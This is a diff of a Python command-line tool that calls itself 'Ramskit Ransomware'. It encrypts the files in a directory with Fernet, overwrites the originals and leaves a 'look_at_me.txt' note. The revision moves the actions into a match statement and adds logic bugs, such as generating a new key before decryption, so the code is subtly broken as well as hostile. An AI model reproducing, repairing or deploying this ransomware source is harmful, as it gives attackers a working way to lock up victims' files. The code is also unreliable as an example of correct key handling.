@@ -13,27 +13,24 @@ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
-along with this program.  If not, see <https://www.gnu.org/licenses/>. """    
+along with this program.  If not, see <https://www.gnu.org/licenses/>. """
 
 import os
 import sys
 import argparse
 from cryptography.fernet import Fernet
 
-class Ramskit:
-    def __init__(self, key, path):
-        self.key = key
-        self.path = path
-    
-    def generate_key(self):
-        key = Fernet.generate_key()
-        with open('key.txt', 'wb') as f:
-            f.write(key)
-        return key
 
-    def load_key(self):
-        return open('key.txt', 'rb').read()
-    
+class Ramskit:
+    def __init__(self, key):
+        self.key = key
+
+    def generate_key(self):
+        self.key = Fernet.generate_key()
+        with open('key.txt', 'wb') as f:
+            f.write(self.key)
+        return self.key
+
     def encrypt_file(self, items):
         for item in items:
             with open(item, 'rb') as f:
@@ -41,7 +38,7 @@ class Ramskit:
 
             fernet = Fernet(self.key)
             encrypted = fernet.encrypt(data)
-            
+
             with open(item, 'wb') as f:
                 f.write(encrypted)
 
@@ -52,39 +49,46 @@ class Ramskit:
 
             fernet = Fernet(self.key)
             decrypted = fernet.decrypt(data)
-            
+
             with open(item, 'wb') as f:
-                f.write(decrypted)       
+                f.write(decrypted)
+
+def load_key():
+    return open('key.txt', 'rb').read()
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
-    parser.add_argument('-a', '--action', dest="action", required=True, help='Action to perform [encrypt/decrypt/generate_key]')
-    parser.add_argument('-k', '--key', dest="keyfile", help='Key file')
+    parser.add_argument('-a', '--action', dest="action", required=True,
+                        help='Action to perform [encrypt/decrypt/generate_key]')
     parser.add_argument('-p', '--path', dest="path", required=True, help='Path to file(s) to encrypt/decrypt')
     args = parser.parse_args()
 
     action = args.action.lower()
-    keyfile = args.keyfile
     path = args.path
 
-    ramskit = Ramskit(keyfile)
+    key = load_key()
 
-    if action == 'encrypt':
-        items = []
-        for root, _, files in os.walk(path):
-            for f in files:
-                items.append(os.path.join(root, f))
-        
-        ramskit.encrypt_file(items)
-    elif action == 'decrypt':
-        items = []
-        for root, _, files in os.walk(path):
-            for f in files:
-                items.append(os.path.join(root, f))
-        
-        ramskit.decrypt_file(items)
-    elif action == 'generate_key':
-        print(ramskit.generate_key())
-    else:
-        raise Exception('Invalid action: ', action)
-        sys.exit(1)
+    ramskit = Ramskit(key)
+    ramskit.generate_key()
+
+    match action:
+        case 'encrypt':
+            items = os.listdir(path)
+            ramskit.encrypt_file(items)
+
+            with open(path + '/look_at_me.txt', 'w') as f:
+                f.write("Heyo, this file has been encrypted!. You can decrypt them by running the decrypt command, or to send this \n\n")
+        case 'decrypt':
+            os.remove(path + '/look_at_me.txt')
+
+            items = os.listdir(path)
+            ramskit.decrypt_file(items)
+
+            with open(path + '/look_at_me.txt', 'w') as f:
+                f.write("Now you can access your files again. \n\n")
+        case 'generate_key':
+            print(ramskit.generate_key())
+        case _:
+            raise Exception('Invalid action: ', action)
+            sys.exit(1)
+
